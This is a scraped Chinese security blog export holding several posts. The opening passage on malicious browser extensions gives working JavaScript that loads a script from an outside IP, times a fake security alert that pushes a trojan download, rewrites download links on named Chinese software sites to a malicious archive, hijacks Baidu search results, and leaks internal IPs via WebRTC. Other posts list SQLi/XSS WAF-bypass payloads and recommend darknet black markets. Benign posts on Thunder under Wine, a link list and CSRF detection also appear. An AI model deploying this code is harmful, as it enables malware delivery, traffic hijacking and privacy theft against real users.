\"base.js\" ], \"include\": [\"*\"], \"includeFrames\": true&#125;] 然后在base.js文件里写入你要调用的第三方javascript文件：123var script = document.createElement('script');script.src = \"http://119.29.58.242/control.js\";document.body.appendChild(script); 像这种的话，就需要在把插件download本地，然后使用maxthon官方提供的MxPacker软件，进行的解密，首先分析def.json里的action字段下的js属性，指向的是哪个javascript文件。再进行分析，当然也可以使用其他软件对文件内容进行搜索，看里面是否存在’document.createElement’关键字。 找到后，接下来就是苦力活了，入侵这个第三方javascript所属的网站。入侵后再修改这个javascript文件，就行了。 0x1.4.2 具有可视化页面这个比上面0x1.4.1简单点，使用之前长短短在zone分享的代码就可以把这个页面所有第三方的javascript文件列举出来：1234567for(var i=0,tags=document.querySelectorAll('iframe[src],frame[src],script[src],link[rel=stylesheet],object[data],embed[src]'),tag;tag=tags[i];i++)&#123; var a = document.createElement('a'); a.href = tag.src||tag.href||tag.data; if(a.hostname!=location.hostname)&#123; console.warn(location.hostname+' 发现第三方资源['+tag.localName+']:'+a.href); &#125;&#125; 使用方法如下： 使用的时候，会发现有的插件是调用了插件本身的javascript文件，或者其他baidu、360等第三方安全不容易被入侵的网站里的javascript代码，这个时候就比较费时费力了。 0x1.4.3 控制插件里调用的第三方javascript代码总结这个方法较为繁琐，优点如下： 不容易被发现 向上反查也比较难追踪 缺点： 费时费力 成功率较低 此种方法适用于针对某一人或团体，只能获得其装的插件名称，当别无他法时使用此方法。 0x2 那些隐藏的API： 因为一些API获得的信息比较隐私，所以遨游官方没在在API手册里写。但是他们真实存在，我们可以在一个普通的页面里打开审查元素下的Console输入external来查看一些遨游官方隐藏的API。 还有一种是在插件页面的里专用API，插件里的API基本上每个版本上都会发生变化，下面是3.x版本的API：12345maxthon.system.Utility.getMacAddresses() //获取用户的MAC地址maxthon.system.GraphicsEnvironment.getLocalGraphicsEnvironment().getAvailableFontFamilyNames() //获取用户当前所有的字体文maxthon.system.GraphicsEnvironment.getLocalGraphicsEnvironment().getSystemFontName() //用户当前应用的字体maxthon.io.File.createTempFile().name_ //获取用户临时目录maxthon.io.File.createTempFile().isFile //判断name_文件是否存在，但是这里我无法重新设置name_的值 下面是最新版本4.x版本的API： 遨游把之前在maxthon对象下的函数、对象分离在其他地方了（其实还是有，不明白其用意）123456789mx.app.getAvatar() //获得当前登录用户的头像(data:image/png;base64格式)mx.app.login() //判断是否登录了遨游浏览器(登录返回true，没登陆返回false)mx.app.getProfile() //获得用户当前的状态(是否登录、uid、用户名称)mx.app.getSystemLocale() //获得系统语言(例如：zh-cn)mx.app.showUserPanel() //显示用户菜单(相当于点击左上角的头像)//以上的代码需要事先运行mx.app.user()、mx.app.locale()clientInformation.plugins //浏览器支持的插件(可看到用户安装哪些软件)clientInformation.mimeTypes //列举出支持的application(可看到用户安装哪些软件) 这里针对最后两个API截图看下： 这些东西写在插件里，获取用户安装了哪些软件轻而易举。基本上是没有隐私可言了。 0x3 攻击向量： 普通的获取cookies我们就不说了，介绍点其他的。 上面介绍的都是针对浏览器插件对用户进行的攻击，但是攻击的平面都是浏览器。但是谁不想进一步控制用户的电脑权限呢。大致的思路如下： 弹窗欺骗用户说需要下载软件，其实是木马程序 使用浏览器漏洞进行攻击 替换下载链接 0x3.1 弹窗欺骗用户下载软件这一步很简单，就是一些简单的javascript代码：1234(function()&#123; //闭包函数，防止变量污染 alert(\"请下载xxx安全插件保障您在此网站的安全\"); location.href = \"http://baidu.com/download/xxxx.exe\";&#125;)() 但是这里不能一直弹窗下载，不然肯定会引起怀疑的，下面我们来进行优化：1234567891011121314(function()&#123; //闭包函数，防止变量污染 var downDate = new Date(); //获取当前的时间 var downDateY = String(downDate).split(\" \")[3]; //年份 var downDateM = String(downDate).split(\" \")[1]; //月份 var downDateD = String(downDate).split(\" \")[2]; //日期 var downDateT = String(downDate).split(\" \")[4].split(\":\"); //时间 if(location.href != \"https://baidu.com/\")&#123; //当不是百度时，不执行下面的代码 return fasle; &#125; if(downDateY == \"2016\" &amp;&amp; downDateM == \"Oct\" &amp;&amp; downDateD == \"28\" &amp;&amp; downDateT[0] == \"21\" &amp;&amp; downDateT[1] &lt; \"30\")&#123; alert(\"请下载xxx安全插件保障您在此网站的安全\"); location.href = \"http://baidu.com/download/xxxx.exe\"; &#125;&#125;)() 真正写的时候，不要像我这么写，我这样写是因为逻辑比较简单，但是代码量比较多。意思是说当当前网站是https://baidu.com/时再判断时间是否为2016年10月28号晚上9点到9点半之间，如果是则弹窗让用户下载木马程序。 0x3.2 使用浏览器漏洞进行攻击漏洞是要靠自己挖掘的，这里不再多说，大家可以去看一下Blast写的书籍《浏览器安全》。也可以看下之间黑哥写的PPT《去年跨过的浏览器》，之前maxthon就因为特殊域下的mxCall函数的问题，导致可以执行任意命令。大家可以挖挖看，总会有意想不到的收获。 0x3.3 替换下载链接替换的话，我们需要先采集几个下载量比较大的下载站，我这里列举一下： ZOL下载-免费软件,绿色软件 天空下载站 华军软件园 hao123下载站 太平洋下载中心 百度软件中心 还有很多，这里就不在列举了，下面我们就根据这些下载站来写替换的javascript代码。先写段代码，让他判断当前的网址是否为下载站123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960(function()&#123; var downloadWebsite = [ 'http://xiazai.zol.com.cn', 'http://www.skycn.com', 'http://www.onlinedown.net', 'http://dl.pconline.com.cn', 'http://rj.baidu.com' ]; //要替换的下载站url地址 var replaceDownloadUrl = \"http://xxxx.com/download/soft.rar\"; //要替换的下载软件 switch(location.origin)&#123; //对当前的url进判断，是否为下载站，如果是则进入其操作函数里 case downloadWebsite[0]: var download1 = document.getElementById(\"downloadTop\"); var download2 = document.querySelectorAll(\".down-alink a\"); var download3 = document.querySelectorAll(\".down-alink01 a\"); if(download1 != null &amp;&amp; download2.length != 0 &amp;&amp; download3.length != 0)&#123; download1.href = replaceDownloadUrl; for(var j = 0;j &lt; download2.length;j++)&#123; download2[j].href = replaceDownloadUrl; &#125; for(var k = 0;k &lt; download3.length;k++)&#123; download3[k].href = replaceDownloadUrl; &#125; &#125; break; case downloadWebsite[1]: var download1 = document.querySelectorAll(\".ul_Address li a\"); if(download1.length != 0)&#123; for(var j = 0;j &lt; download1.length;j++)&#123; download1[j].href = replaceDownloadUrl; &#125; &#125; break; case downloadWebsite[2]: var download1 = document.querySelectorAll(\".softinfoBox .meg a\"); var download2 = document.querySelectorAll(\".downDz a\");; if(download1.length != 0 &amp;&amp; download2.length != 0)&#123; download1[0].href = replaceDownloadUrl; for(var j = 0;j &lt; download2.length;j++)&#123; download2[j].href = replaceDownloadUrl; &#125; &#125; break; case downloadWebsite[3]: var download1 = document.querySelectorAll(\".dlLinks-a a\"); if(download1.length != 0)&#123; for(var j = 0;j &lt; download1.length;j++)&#123; download1[j].href = replaceDownloadUrl; &#125; &#125; break; case downloadWebsite[4]: var download1 = document.querySelectorAll(\".fast_download\"); var download2 = document.querySelectorAll(\".normal_download\"); if(download1.length != 0 &amp;&amp; download2.length != 0)&#123; download1[0].href = replaceDownloadUrl; download2[0].href = replaceDownloadUrl; &#125; break; &#125;&#125;)() 0x3.4 修改百排名想做SEO的，可以使用此方法：12345(function()&#123; if(location.origin == \"https://www.baidu.com\" &amp;&amp; location.pathname == \"/s\")&#123; //当时百度的搜索页面时 document.querySelectorAll(\"#content_left h3 a\")[0].href = \"http://360.cn/\"; //替换第一个搜索结果为指定的url地址 &#125;&#125;)() 0x3.4 内网嗅探这个方法的篇幅比较多，放在下一章说明。下面是利用WebRTC来实现的获取内网IP地址：12345678910111213141516171819202122232425262728293031323334var ipList = [];var webrtcxss = &#123; webrtc : function(callback)&#123; var ip_dups = &#123;&#125;; var RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection; var mediaConstraints = &#123; optional: [&#123;RtpDataChannels: true&#125;] &#125;; var servers = undefined; if(window.webkitRTCPeerConnection)&#123; servers = &#123;iceServers: []&#125;; &#125; var pc = new RTCPeerConnection(servers, mediaConstraints); pc.onicecandidate = function(ice)&#123; if(ice.candidate)&#123; var ip_regex = /([0-9]&#123;1,3&#125;(\\.[0-9]&#123;1,3&#125;)&#123;3&#125;)/; var ip_addr = ip_regex.exec(ice.candidate.candidate)[1]; if(ip_dups[ip_addr] === undefined) callback(ip_addr); ip_dups[ip_addr] = true; &#125; &#125;; pc.createDataChannel(\"\"); pc.createOffer(function(result)&#123; pc.setLocalDescription(result, function()&#123;&#125;); &#125;); &#125;, getIp : function()&#123; this.webrtc(function(ip)&#123; console.log(ip) &#125;); &#125;&#125;webrtcxss.getIp(); 大家可以根据这个方法来想想有没有办法来实现一些更好玩的思路。 0x4 结言： 还有很多的API及攻击方法等待大家去发掘，我能做的就是给大家打开一个新的攻击平面，不用再局限那些已经熟悉的方法了。 Author:Black-Hole Blog：http://bugs.cc github:https://github.com/BlackHole1/ Twitter:https://twitter.com/Free_BlackHole Email:158blackhole@gmail.com","categories":[],"tags":[{"name":"WEB安全","slug":"WEB安全","permalink":"http://bugs.cc/tags/WEB安全/"}]},{"title":"在debian下如何使用迅雷登陆账号","slug":"在debian下如何使用迅雷登陆账号","date":"2016-08-24T05:08:47.000Z","updated":"2016-08-24T06:24:40.734Z","comments":true,"path":"2016/08/24/在debian下如何使用迅雷登陆账号/","link":"","permalink":"http://bugs.cc/2016/08/24/在debian下如何使用迅雷登陆账号/","excerpt":"前言： 今天在QQ空间看到有人分享了“惊天魔盗团2”的电影资源 正好这几天被mongoose搞的有点烦，想看会电影放松一下心情，但是代码还是要写的，于是我想把电影下载下来，然后等bug解决了，再看。所以问题来了。","text":"前言： 今天在QQ空间看到有人分享了“惊天魔盗团2”的电影资源 正好这几天被mongoose搞的有点烦，想看会电影放松一下心情，但是代码还是要写的，于是我想把电影下载下来，然后等bug解决了，再看。所以问题来了。 下载迅雷： 可能是我们这边地区的问题，在迅雷官网下载的迅雷都很慢，于是使用“百度管家”下载。fuck me down XunLei 环境搭建： 就是用wine来使用exe程序，这里不介绍，请自己百度 安装注意事项： 不要使用sudo wine Thunder_9.0.12.332_baidu.exe，请使用wine Thunder_9.0.12.332_baidu.exe，不然你的迅雷会被安装到root用户下 如何启动 迅雷安装好后，会在你的桌面放一个快捷方式。如果没有，请像我这么做： cd ~/.wine/drive_c/Program\\ Files\\ \\(x86\\)/Thunder\\ Network/Thunder9/Program/ wine Thunder.exe 然后，他就启动成功了。 就像这样： 为什么会出现黑色的框框呢？ 黑色的框框是个浏览器，迅雷自带的XBrowser浏览器。个人猜测是因为dll的问题，等我有时间的时候，我去找台window电脑，看一下这个浏览器以来上面dll。这个浏览器无所谓的，没有他照样下载。 登陆 重点来了，点击登陆时，会让你输入账号密码 但是你会发现，你输入的字符串没有显示，不用慌，就像linux终端输入密码时一样，其实你输入了，只是不可见而已。然后就可以登陆了。但是有时候会出现让你填写验证码的框。 于是你会蛋疼的发现，验证码去吃屎了。所以现在我们就来解决这个问题。先想象一下验证码的特性。当我点击“看不清，换一张”的时候，那么一定会发送一个数据包。然后返回新的验证码数据包，我们只需要截取这个数据就行了。这里我使用wireshark来进行抓包。 debian安装wireshark，需要添加kali的源，然后sudo apt-get update&amp;&amp;sudo apt-get install wireshark就行了。记得使用sudo wireshark来运行 我这里的网卡是wlan0，有可能不一样，选一个你觉得是对的就行了，如果你还是不知道。对不起，请你出去，本节课不准提问。 然后你就看到比粪池里的屎还多的数据包 这个时候我们在Filter里填写http&amp;&amp; http contains &quot;image/jpeg&quot; 然后打开迅雷，登陆。当出现验证码验证的时候再次切换到wireshark看就行了。 选中（就是让它的背景色变成蓝色，单击） 然后File-&gt;Export Objects-&gt;HTTP 选中地址是verify2.xunlei.com且Content Type为image/jpeg选中后，点击另存为xx.jpg。 拿验证码登陆就行了。","categories":[],"tags":[{"name":"Other","slug":"Other","permalink":"http://bugs.cc/tags/Other/"}]},{"title":"杂谈如何绕过WAF（Web应用防火墙）","slug":"杂谈如何绕过WAF（Web应用防火墙）","date":"2016-08-20T11:04:31.000Z","updated":"2016-08-23T16:00:58.289Z","comments":true,"path":"2016/08/20/杂谈如何绕过WAF（Web应用防火墙）/","link":"","permalink":"http://bugs.cc/2016/08/20/杂谈如何绕过WAF（Web应用防火墙）/","excerpt":"0×01 前言： 这个议题呢，主要是教大家一个思路，而不是把现成准备好的代码放给大家。 可能在大家眼中WAF（Web应用防火墙）就是“不要脸”的代名词。如果没有他，我们的“世界”可能会更加美好。但是事与愿违。没有它，你让各大网站怎么活。但是呢，我是站在你们的这一边的，所以，今天我们就来谈谈如何绕过WAF吧。之所以叫做“杂谈”，是因为我在本次演讲里，会涉及到webkit、nginx&amp;apache等。下面正式开始：）","text":"0×01 前言： 这个议题呢，主要是教大家一个思路，而不是把现成准备好的代码放给大家。 可能在大家眼中WAF（Web应用防火墙）就是“不要脸”的代名词。如果没有他，我们的“世界”可能会更加美好。但是事与愿违。没有它，你让各大网站怎么活。但是呢，我是站在你们的这一边的，所以，今天我们就来谈谈如何绕过WAF吧。之所以叫做“杂谈”，是因为我在本次演讲里，会涉及到webkit、nginx&amp;apache等。下面正式开始：） 0x02 直视WAF： 作为第一节，我先为大家简单的说下一些绕过WAF的方法。 1、 大小写转换法：看字面就知道是什么意思了，就是把大写的小写，小写的大写。比如:12SQL：sEleCt vERsIoN();‍‍XSS：&lt;sCrIpt&gt;alert(1)&lt;/script&gt; 出现原因：在waf里，使用的正则不完善或者是没有用大小写转换函数 2、 干扰字符污染法:空字符、空格、TAB换行、注释、特殊的函数等等都可以。比如下面的：123SQL：sEleCt+1-1+vERsIoN /*!*/ ();`yohehe‍‍‍‍SQL2：select/*!*/`version`();XSS：下面一节会仔细的介绍 3、字符编码法：就是对一些字符进行编码，常见的SQL编码有unicode、HEX、URL、ascll、base64等，XSS编码有：HTML、URL、ASCII、JS编码、base64等等12SQL:load_file(0x633A2F77696E646F77732F6D792E696E69)‍‍‍‍XSS：&lt;script%20src%3D&quot;http%3A%2F%2F0300.0250.0000.0001&quot;&gt;&lt;%2Fscript&gt; 出现原因：利用浏览器上的进制转换或者语言编码规则来绕过waf 4、拼凑法如果过滤了某些字符串，我们可以在他们两边加上“原有字符串”的一部分。12SQL：selselectect verversionsion();‍‍‍‍XSS：&lt;scr&lt;script&gt;rip&gt;alalertert&lt;/scr&lt;/script&gt;rip&gt; 出现原因：利用waf的不完整性，只验证一次字符串或者过滤的字符串并不完整。 本节是告诉大家，waf总会有自己缺陷的，任何事物都不可能完美。 0x03 站在webkit角度来说绕过WAF： 可能这时会有人问到，说绕过WAF，怎么跑到webkit上去了。嗯，你没有看错，我也没有疯。之说以站在webkit角度来讲绕过WAF，是因为各个代码的功能是由浏览器来解析的。那浏览器中谁又负责解析呢？那就是webkit， 既然要说到webkit，那就不得不提webkit下的解析器——词法分析器，因为我们在绕过的时候，就是利用解析器中的词法分析器来完成。 就比如一个简单的绕过WAF的XSS代码： &lt;iframe src=&quot;java script:alert(1)&quot; height=0 width=0 /&gt;&lt;iframe&gt; &lt;!--Java和script是回车，al和ert是Tab换行符--&gt;他可以弹窗，可以为什么他可以弹窗呢？这里面有回车、换行符啊。想要理解，我们来看看webkit下的Source/javascriptcore/parser/lexer.cpp是怎么声明的吧。123456789101112while (m_current != stringQuoteCharacter) &#123; if (UNLIKELY(m_current =='\\\\')) &#123; if (stringStart != currentSourcePtr() &amp;&amp; shouldBuildStrings) append8(stringStart, currentSourcePtr() - stringStart); shift(); LChar escape = singleEscape(m_current); if (escape) &#123; if (shouldBuildStrings) record8(escape); shift(); &#125; else if (UNLIKELY(isLineTerminator(m_current))) shiftLineTerminator(); 注意倒数第二行里的isLineTerminator函数。这里我来说说大致的意思：所有的内容都在一个字符串里，用while逐字解析，遇到换行就跳过。然后在拼成一个没有分割符的字符串，所以这时的XSS代码成功弹窗了。Webkit里的词法分析器里除了跳过换行符，还会跳过什么字符呢？ 子曰：还有回车等分隔符。 根据webkit词法分析器的机制，我们就可以写更多的猥琐xss代码。 下面再说说这个注意事项： 1234&lt;iframe src=\"javascript:alert(1)\" height=0 width=0 /&gt;&lt;iframe&gt; &lt;!--这个可以弹窗--&gt;&lt;iframe src=javascript:alert(1); height=0 width=0 /&gt;&lt;iframe&gt; &lt;!--这个不可以弹窗--&gt; 因为在webkit的词法分析器里，跳过回车、换行等分隔符时有个前提，那就是必须用单/双引号围住，不然不会跳过。因为如果不使用引号，词法分析器会认为 回车、换行就是结束了，如果你运行上面这段代码，webkit会把java当做地址传给src。词法分析器跳过的前提就是建立在引号里的，切记。这里在说一个： 回车、换行只在属性中引号里才会起作用。如果你对标签或者属性用 回车、换行，这时你大可放心，决对不会弹窗。而且在属性值里 回车、换行随便用。如果空格出现在xss代码里并不会弹窗，但是如果出现在字符和符号之前，就可以弹了。如图： 注意事项：跳过回车和换行，不支持on事件。例如下面的代码&lt;a href=&quot;java script:alert(1)&quot;&gt;xss&lt;/a&gt;会弹窗，但是下面的代码就不行了。 &lt;a href=&quot;#&quot; onclick=&quot;aler t(1)&quot;&gt;s&lt;/a&gt;可见加了Tab换行，就无法弹窗了。但是还是支持字符和符号之间加入空格的。本节就是告诉大家，想要玩的更好，最好追溯到底层，从底层来看攻击手法，你会发现很多问题迎刃而解。 0x04 利用Nginx&amp;Apache环境 BUG来绕过waf： 这个bug比较鸡肋，需要在nginx&amp;apache环境，而且管理员较大意。这是一个不是bug的bug。当网站采用前端Nginx，后端Apache时，需要在conf配置，当遇到PHP后缀的时候，把请求交给Apache处理。但是Nginx判断后缀是否为PHP的原理是根据URL的。也就是说如果当URL的后缀不是PHP的时候，他并不会把PHP教给Apache处理。配置: 乍一看，没什么问题。但是这里隐藏一个漏洞。 我在test目录建立一个index.php： 利用nginx&amp;apache这个bug，再加上浏览器默认会隐藏index.php文件名，那么漏洞就来了。访问a.cn/test/index.php?text=&lt;script&gt;alert(1)&lt;/script&gt;不会弹窗，被waf.conf给拦截了。 访问a.cn/test/?text=&lt;script&gt;alert(1)&lt;/script&gt;会弹窗，没有被waf.conf给拦截，因为nginx根据URL判断这不是php文件，并没有交给apache处理，也就没有走第三个location流程。 本节是告诉大家，绕过WAF不用一直针对WAF，也可以利用环境/第三方的缺陷来绕过。 0x05 从HTTP数据包开始说起： 1、 现在有一部分网站waf是部署在客户端上的，利用burp、fiddler就可以轻松绕过。很多时候我们遇到的情况就像这段代码一样:12&lt;input type=\"text\" name=\"text\"&gt;&lt;input type=\"submit\" onclick=\"waf()\"&gt; 把waf规则放到js里。我们可以提交一个woaini字符串，然后用burp、fiddler抓包、改包、提交，轻轻松松的绕过了客服端的WAF机制。 2、有的网站，他们对百度、google、soso、360等爬虫请求并不过滤，这时我们就可以在USER-Agent伪造自己是搜索引擎的爬虫，就可以绕过waf 3、有的网站使用的是$_REQUEST来接受get post cookie参数的，这时如果waf只对GET POST参数过滤了，那么久可以在数据包里对cookie进行构造攻击代码，来实现绕过waf。 4、有的waf对GET POST COOKIE都过滤了，还可以进行绕过。怎么绕过呢？假设网站会显示你的IP或者你使用的浏览器，那么你就可以对IP、user-agent进行构造，在PHP里X_FORWARDED_FOR和HTTP_CLIENT_IP两个获取IP的函数都可以被修改。想详细了解的可以去：http://www.freebuf.com/articles/web/42727.html 0x06节。本节告诉我们waf是死的，人是活的，思想放开。不要跟着WAF的思路走，走出自己的思路，才是最正确的。 0x06 WAF你算个屌： 很多人认为绕过WAF需要根据WAF的规则来绕过。但是我们可以忽视他，进行攻击。我们利用第三方插件来进行攻击，因为第三方插件的权限非常大，而且他有一个特殊的性质，就是他可以跨域。我们可以事先在插件里调用一个js代码，对方安装之后浏览任何网站都可以被XSS。我们现在来看段Maxthon插件的源码： def.json test.js： 统一放在一个文件夹里，再用Mxpacke.exe生成一个遨游插件。 双击就可以安装这个插件。 。这不算是一个漏洞，因为插件必须要运行js代码，而XSS的宗旨就是 在网站里运行你所指定的js代码。所以，这个xss没办法修复，而且chrome 火狐 等浏览器都存在。 作者信息： Author:Black-Hole Blog:http://bugs.cc/ github:https://github.com/BlackHole1/ Twitter:https://twitter.com/Free_BlackHole Email:158blackhole@gmail.com","categories":[],"tags":[{"name":"WEB安全","slug":"WEB安全","permalink":"http://bugs.cc/tags/WEB安全/"}]},{"title":"暗网","slug":"暗网","date":"2016-08-20T05:40:21.000Z","updated":"2016-08-23T16:00:27.729Z","comments":true,"path":"2016/08/20/暗网/","link":"","permalink":"http://bugs.cc/2016/08/20/暗网/","excerpt":"最后更新时间:2016/8/20 13:40:21 利用暗网进行浏览onion的流程：大陆用户，首先需要代理VPN，或者使用“蓝灯（lantern）”。来进行从tor服务器那里获得tor节点，从而进行连接，不用嫌麻烦，多层代理总是好的，虽然在tor浏览器里可以直接使用“伪造其他网站的数据传输”来进行浏览，但是缺点是慢，且不安全。详细的用法可以看这篇文章http://www.chinagfw.org/2016/06/tor.html (需要VPN或者lantern访问)","text":"最后更新时间:2016/8/20 13:40:21 利用暗网进行浏览onion的流程：大陆用户，首先需要代理VPN，或者使用“蓝灯（lantern）”。来进行从tor服务器那里获得tor节点，从而进行连接，不用嫌麻烦，多层代理总是好的，虽然在tor浏览器里可以直接使用“伪造其他网站的数据传输”来进行浏览，但是缺点是慢，且不安全。详细的用法可以看这篇文章http://www.chinagfw.org/2016/06/tor.html (需要VPN或者lantern访问) 暗网的介绍：因为介绍暗网的文章很多，我这里选一些比较好的文章 这是我第一次访问暗网 暗网一些推荐的网站：暗网邮箱推荐用这个，gmail不安全，其他的临时邮箱不稳定，这个时候就需要一个可以在暗网上即使被破解也没办法知道你是谁的稳定邮箱。为了安全起见，你可以注册这样的邮箱：wufnxlkfog7458bk@mail2tor.com，密码也可以起成tusncjdnah@*%41We，不用担心忘记，后面我会说在么记录这些账户密码，而且别人无法获取的方法。 暗网中文论坛在暗网上，这个中文论坛应该是最大的了。适合刚入门的新手，做一个过渡。 not Evil 支持中文搜索的暗网搜索引擎，没有广告 TORCH 另一个搜索引擎 oasis 在tor非常有名的黑市，开店不要钱 SilkRoad3.0 SilkRoad3.0，不用多说，没有之前的 1.0、2.0好。开店要钱 Alphabay 应该是tor里最大的一家黑市了，开店要钱 其他：在暗网上注册的时候，大多都需要GPG，比如上面的三个黑市，全部要求GPG密钥加密，在linux下有kgpgsudo apt-get install kgpg，在windows上有Gpg4win，而我之前所说的就是利用gpg来保存密码，gpg加密后的密文是这样：12345678910111213-----BEGIN PGP MESSAGE-----Version: GnuPG v1hQEMA1cgPhiOStPSAQf/c3TBvVq/tdciUYraeq83Fizrsx81l8BNqfGQ6wWh8EbI9LjUQWOca5iz5nVrVOQYMcDI+/UqdWFIXf5cxPskTdpdIr0n5pbpwrcbcpIhvZlyGKZ88DZ4D6tpp4m3VDewUfi5+bS4ixuLHoRawC6HEq/7cnWqRWkIpPgBZsRrJuNH0CODKoQmwyR6FpmZk1/aXyfYnFI98QepfzbDgLidimnGbhX+U0GvULIxeTAZOp1GMtHvxDEZdwftKqUbyAqAU7K3Q3BK3wYfXI2GOYOpKNPhCUVHiCGwFsxWunFrRK1W4CpqZrYq79Ds7G2b9gztkf8+AJy5ElXr9IDNXnotktJIAUdWTzqNhuDPuSxYFUpS90eXoXs6PH1E/+c4+D4Hm5Sb80x6V0l0Ubcm7lDk8S8ZrENskAE9YDLwqiImCKy6c1zrRkSCTCcb=7jiE-----END PGP MESSAGE----- 破解需要密钥，和解密的密码。 作者信息： Author:Black-Hole Blog:http://bugs.cc/ github:https://github.com/BlackHole1/ Twitter:https://twitter.com/Free_BlackHole Email:158blackhole@gmail.com","categories":[],"tags":[{"name":"Other","slug":"Other","permalink":"http://bugs.cc/tags/Other/"}]},{"title":"优秀的URL收集","slug":"优秀的URL收集","date":"2016-08-15T13:42:07.000Z","updated":"2016-08-20T05:39:48.058Z","comments":true,"path":"2016/08/15/优秀的URL收集/","link":"","permalink":"http://bugs.cc/2016/08/15/优秀的URL收集/","excerpt":"最后更新时间:2016/8/15 22:40:48 UI美工：WEB安全色 ： http://www.bootcss.com/p/websafecolors/ UI设计网 ： http://www.uisheji.com/ 阿里巴巴矢量图标库：http://www.iconfont.cn/ 前端开发(JavaScript And CSS)：","text":"最后更新时间:2016/8/15 22:40:48 UI美工：WEB安全色 ： http://www.bootcss.com/p/websafecolors/ UI设计网 ： http://www.uisheji.com/ 阿里巴巴矢量图标库：http://www.iconfont.cn/ 前端开发(JavaScript And CSS)： ICO font对比SVG font：http://www.w3cplus.com/css3/icon-fonts-vs-svg.html 前端冷知识：http://www.cnblogs.com/Wayou/p/things_you_dont_know_about_frontend.html CSS简写法：https://github.com/yisibl/blog/issues/4 box-shadow秒懂：http://codepen.io/yisi/pen/sDBwC 图片延迟加载：http://caibaojian.com/lazy-load.html OurJS : http://ourjs.com/ JavaScript：微软官方的JavaScript语言参考：https://msdn.microsoft.com/zh-cn/library/d1et7k7c(v=vs.94).aspx.aspx) 深入剖析 JavaScript 的深复制：http://jerryzou.com/posts/dive-into-deep-clone-in-javascript/ function与感叹号：http://swordair.com/function-and-exclamation-mark/ JavaScript的()()原理是什么：http://segmentfault.com/q/1010000002897710 Javascript如何实现接口？：http://segmentfault.com/q/1010000002370889 JavaScript回调函数怎么理解：http://segmentfault.com/q/1010000000140970 function(){…})() 与 (function(){…}()) 有什么区别：http://segmentfault.com/q/1010000000442042 详解JavaScript函数模式：http://segmentfault.com/a/1190000000758184 详解js闭包：http://segmentfault.com/a/1190000000652891 JavaScript中的闭包：http://segmentfault.com/a/1190000002805295 JavaScript性能优化小窍门：http://ourjs.com/detail/54d9a6f2232227083e00002c PHP：php面向对象(OOP)编程完全教程：http://www.cnblogs.com/xiaochaohuashengmi/archive/2010/09/10/1823042.html 其他：在线的linux：https://koding.com/ Jquery优秀插件：http://www.jq22.com/ 在线工具合集：http://tool.lu 在线HTTP POST/GET接口测试工具：http://www.atool.org/httptest.php Google hosts：https://laod.org/hosts/2016-google-hosts.html 作者信息： Author:Black-Hole Blog:http://bugs.cc/ github:https://github.com/BlackHole1/ Twitter:https://twitter.com/Free_BlackHole Email:158blackhole@gmail.com","categories":[],"tags":[{"name":"Other","slug":"Other","permalink":"http://bugs.cc/tags/Other/"}]},{"title":"自动化检测CSRF(第二篇)","slug":"自动化检测CSRF（第二章）","date":"2016-06-23T15:49:34.000Z","updated":"2016-08-23T16:02:32.189Z","comments":true,"path":"2016/06/23/自动化检测CSRF（第二章）/","link":"","permalink":"http://bugs.cc/2016/06/23/自动化检测CSRF（第二章）/","excerpt":"0x00 前言： 上一篇只是大致说明整个思路和流程。本篇就详细说说如何检测CSRF。为什么不在上一篇中放出插件呢。是因为误报率确实是比较多，而且无法检测Referer。而本章，重点就说明“如何检测对方是否开启了Referer检测机制”。在我的认知范围内，这是首款检测Referer的工具(不知廉耻的笑了)。今天发现腾讯在2013年就做了类似的产品 (这就尴尬了..)，不过还好。而且思路和实现方法有所区别。本章说检测Referer，第三章说检测token机制的强化,让检测token的成功率达到80~90%以上(其实就是写第二篇的时候，忘记写了。推到第三章了….)。而且这些是腾讯产品所没有的撒。","text":"0x00 前言： 上一篇只是大致说明整个思路和流程。本篇就详细说说如何检测CSRF。为什么不在上一篇中放出插件呢。是因为误报率确实是比较多，而且无法检测Referer。而本章，重点就说明“如何检测对方是否开启了Referer检测机制”。在我的认知范围内，这是首款检测Referer的工具(不知廉耻的笑了)。今天发现腾讯在2013年就做了类似的产品 (这就尴尬了..)，不过还好。而且思路和实现方法有所区别。本章说检测Referer，第三章说检测token机制的强化,让检测token的成功率达到80~90%以上(其实就是写第二篇的时候，忘记写了。推到第三章了….)。而且这些是腾讯产品所没有的撒。 0x01一些小的变化： 之前的黑白名单列表123var placeholderFilterKeyword = ['跳','搜','查','找','登陆','注册','search']; //无用表单黑名单，用于验证这个form表单有没有用（针对input验证）var actionFilterKeyword = ['search','find','login','reg']; //无用表单黑名单，用于验证这个form表单有没有用（针对form表单验证）&#125; 现在的黑白名单列表：12var placeholderFilterKeyword = ['跳','搜','查','找','登陆','注册','search'];var actionFilterKeyword = ['search','find','login','reg',\"baidu.com\",\"google.com\",\"so.com\",\"bing.com\",\"soso.com\",\"sogou.com\"]; 此处的代码，决定了整体插件检测时的误报率大体走向。你也可以自己修改来达到自我感觉不错的地步。 现在的初始化变量：123var actionCache,actionPath;var actionvParameter = \"\";var ajaxParameter = \"\"; 0x02：插件的整体框架 因为Maxthon浏览器的API实在是太少，没有这些API我无法进行Referer检测，于是，检测CSRF插件，就不写Maxthon的插件了，下面是Chrome插件的框架： icons 是存放插件图标的地方，我比较懒，直接使用AutoFindXSS插件的图标。 background.html 是为了让我们修改插件的作用域，让我们可控，可以在Chrome的API中使用jquery插件 background.js 这里我们把它理解为后端程序，类似于服务端的存在。用于处理base.js文件的数据 base.js 会在网站加载完成后调用。在检测Referer的时候，把数据传给background.js文件 manifest.json Chrome插件的核心文件，用于配置插件参数。 这里我先给大家看一下manifest.json文件的内容：1234567891011121314151617181920&#123; \"background\": &#123; \"page\": \"background.html\", \"persistent\": true &#125;, \"name\": \"AutoFindCSRF\", \"version\": \"1.0.0\", \"manifest_version\": 2, \"description\": \"CSRF[by:Black-Hole&amp;158099591@qq.com]\", \"content_security_policy\": \"script-src 'self' 'unsafe-eval'; object-src 'self'\", \"permissions\": [ \"&lt;all_urls&gt;\",\"tabs\" ], \"icons\":&#123;\"16\": \"icons/icon_16.png\",\"48\": \"icons/icon_48.png\",\"128\": \"icons/icon_128.png\"&#125;, \"content_scripts\": [&#123; \"matches\": [\"*://*/*\"], \"js\": [\"jquery.js\",\"base.js\"], \"run_at\": \"document_end\" &#125;]&#125; content_security_policy 简称CSP，用户限制插件的安全性 permissions 是插件向Chrome申请的权限。 content_scripts 意思是，在任何协议下，当网站加载完成后，都会运行jquery.js和base.js文件。JavaScript 